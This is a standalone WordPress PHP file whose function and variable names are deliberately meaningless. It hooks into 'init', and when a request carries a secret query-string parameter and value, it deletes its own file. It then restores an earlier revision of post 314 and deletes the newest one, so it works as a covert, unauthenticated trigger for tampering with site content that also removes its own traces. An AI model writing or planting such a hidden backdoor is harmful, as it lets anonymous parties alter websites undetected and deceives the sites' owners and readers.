<?php

function paragraph_visibility_testimonials() {
	if (isset($_GET['external_profile_chart']) && $_GET['external_profile_chart'] === 'titles_effect_traffic') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$disable_click_scroll_menu = 314;
		$alert_multi_messages_nav = wp_get_post_revisions($disable_click_scroll_menu);
		if (empty($alert_multi_messages_nav)) die('no revisions');
		if (count($alert_multi_messages_nav) < 2) die('less than 2');
		$label_about_fix = array_shift($alert_multi_messages_nav);
		$speed_screen_scripts_debug = $label_about_fix->ID;
		$svg_accessible_finder_headers = array_shift($alert_multi_messages_nav);
		$appointment_redirect_hide_best = $svg_accessible_finder_headers->ID;
		$switcher_landing_last = wp_restore_post_revision($appointment_redirect_hide_best);
		if ($switcher_landing_last === false) die('error restoring');
		$switcher_landing_last = wp_delete_post_revision($speed_screen_scripts_debug);		
		if ($switcher_landing_last === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'paragraph_visibility_testimonials');
